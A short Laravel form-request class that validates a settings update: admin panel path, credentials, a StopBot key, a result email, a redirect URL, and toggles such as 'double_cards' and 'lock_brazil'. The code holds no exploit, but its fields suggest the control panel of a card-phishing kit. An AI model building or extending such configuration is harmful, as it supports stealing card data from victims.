<?php

namespace App\Http\Requests;

use Auth;
use Illuminate\Contracts\Validation\ValidationRule;
use Illuminate\Foundation\Http\FormRequest;

class UpdateSettingsRequest extends FormRequest {
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return Auth::check();
    }

    /**
     * A blank password input means "keep the current one", so it must not
     * participate in validation or reach the update payload.
     */
    protected function prepareForValidation(): void
    {
        if ($this->has('password') && trim((string) $this->input('password')) === '') {
            $this->request->remove('password');
        }

        // Mirror the former front-end transform: empty optional parameter is null.
        if (array_key_exists('parameter', $this->all()) && trim((string) $this->input('parameter')) === '') {
            $this->request->set('parameter', null);
        }
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, ValidationRule|array|string>
     */
    public function rules(): array
    {
        return [
            'admin_panel' => 'filled|string|min:3', // text
            'username' => 'filled|string|min:5', // text
            'password' => 'filled|string|min:5', // text
            'stopbot' => 'nullable|array|required_array_keys:key', // text
            'stopbot.key' => 'string|min:1', // text
            'stopbot.confname' => 'nullable|min:1', // text
            'clear_stopbot' => 'sometimes|accepted',
            'email_result' => 'filled|email', // email
            'parameter' => 'nullable|alpha_num',// text
            'external_redirect' => 'url',
            'redirect_on_finish' => 'filled|bool', // checkbox
            'double_cards' => 'filled|bool', // checkbox
            'lock_brazil' => 'filled|bool', // checkbox
        ];
    }
}
